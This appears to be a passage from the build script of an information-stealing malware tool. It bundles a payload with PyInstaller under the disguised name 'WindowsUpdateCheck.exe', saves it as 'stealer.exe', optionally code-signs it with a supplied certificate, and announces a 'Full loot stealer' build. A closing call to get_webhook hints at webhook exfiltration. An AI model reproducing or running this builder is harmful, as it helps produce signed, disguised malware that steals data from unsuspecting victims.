    result = subprocess.run(pyi_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller failed:\n{result.stderr}")

    bundled_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(bundled_exe, final)

    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
        if pfx_pass:
            sign_cmd += ["/p", pfx_pass]
        sign_cmd += [final]
        sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if sign_result.returncode != 0:
            print(f"Signing failed:\n{sign_result.stderr}")
        else:
            print("Signed.")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Full loot stealer built: {final}")

if __name__ == "__main__":
    get_webhook()
